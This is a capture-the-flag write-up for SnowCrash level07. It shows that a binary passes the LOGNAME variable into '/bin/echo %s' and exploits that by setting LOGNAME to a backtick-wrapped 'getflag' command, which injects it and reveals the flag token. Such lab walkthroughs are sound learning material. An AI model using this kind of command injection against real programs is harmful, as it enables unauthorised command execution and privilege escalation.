# level07

We found a binary file in our home directory

If we run it we get this output

```
level07@SnowCrash:~$ ./level07
level07
```

We use hexdump we find out that the LOGNAME has to be involved somehow this matches with the output it gives us
which is the same as the LOGNAME
```
hexdump -C level07
..........................................................
00000630  55 89 e5 53 83 ec 04 a1  14 9f 04 08 83 f8 ff 74  |U..S...........t|
00000640  13 bb 14 9f 04 08 66 90  83 eb 04 ff d0 8b 03 83  |......f.........|
00000650  f8 ff 75 f4 83 c4 04 5b  5d c3 90 90 53 83 ec 08  |..u....[]...S...|
00000660  e8 00 00 00 00 5b 81 c3  8f 19 00 00 e8 1f fe ff  |.....[..........|
00000670  ff 83 c4 08 5b c3 00 00  03 00 00 00 01 00 02 00  |....[...........|
00000680  4c 4f 47 4e 41 4d 45 00  2f 62 69 6e 2f 65 63 68  |LOGNAME./bin/ech|
00000690  6f 20 25 73 20 00 00 00  01 1b 03 3b 30 00 00 00  |o %s ......;0...|
000006a0  05 00 00 00 28 fd ff ff  4c 00 00 00 7c fe ff ff  |....(...L...|...|
000006b0  70 00 00 00 18 ff ff ff  90 00 00 00 88 ff ff ff  |p...............|
000006c0  cc 00 00 00 8a ff ff ff  e0 00 00 00 14 00 00 00  |................|
000006d0  00 00 00 00 01 7a 52 00  01 7c 08 01 1b 0c 04 04  |.....zR..|......|
..........................................................
```
We try changing the logname variable value

```
level07@SnowCrash:~$ export LOGNAME="\`getflag\`"
```
The ` charactes are necessary so that instead of running it as a string it runs as
a command

```
level07@SnowCrash:~$ ./level07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h

```
Voila, we get the next flag token :)
